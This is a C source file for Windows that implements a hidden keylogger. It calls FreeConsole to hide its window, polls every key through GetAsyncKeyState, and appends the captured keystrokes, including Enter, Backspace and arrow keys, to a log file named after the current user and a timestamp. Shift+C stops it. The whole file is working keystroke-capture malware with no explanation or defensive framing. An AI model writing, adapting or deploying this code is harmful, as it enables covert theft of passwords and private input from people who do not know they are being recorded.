#include<windows.h>
#include<stdlib.h>
#include<stdio.h>
#include<ctype.h>
#include<time.h>
#include<string.h>

#define WIN32_LEAN_AND_MEAN
FILE *f;
int status = 1;
char filename[120];

void savexit(void){
	fclose(f);
	exit(0);
}

char *getTime(){
	char *buf = malloc(32);
	memset(buf, 0, 32);
	return itoa(time(NULL), buf, 10);
}

int main(void){
	FreeConsole();
	atexit(savexit);
	char tmp[50];
	DWORD size = sizeof(tmp);
	GetUserName(tmp, &size);
	system("mkdir logs");
	strcat(filename, "logs/");
	strcat(filename, tmp);
	strcat(filename, "-");
	strcat(filename, getTime());
	strcat(filename, ".log");
	f=fopen(filename, "a+");
	int i;
	while(status == 1){
		if(GetAsyncKeyState(0x10) < 0 && GetAsyncKeyState(0x10) < 0 && GetAsyncKeyState(0x43) < 0) savexit();
		for(i = 0 ; i < 256 ; i++) {
			if(GetAsyncKeyState(i) < 0) {
				if(i >= 0x30 && i <= 0x5A) {
					if(GetAsyncKeyState(VK_SHIFT) == 0) fprintf(f, "%c" , tolower(i));
					else fprintf(f, "%c", i);
				}
				else if(i == VK_SPACE)		fprintf(f, " ");
				else if(i == VK_RETURN)		fprintf(f, "[ENTER]");
				else if(i < 0x29 && i > 0x24) {
					if(i == VK_LEFT)		fprintf(f, "[LEFT]");
					else if(i == VK_RIGHT)		fprintf(f, "[RIGHT]");
					else if(i == VK_UP)			fprintf(f, "[UP]");
					else if(i == VK_DOWN)		fprintf(f, "[DOWN]");
				} else if(i < 0x10 && i > 0x07) {
					if(i == VK_BACK)		fprintf(f, "[BS]");
					else if(i == VK_TAB)		fprintf(f, "[TAB]");
				}
			}
		}
		Sleep(75);
	}
	return 0;
}
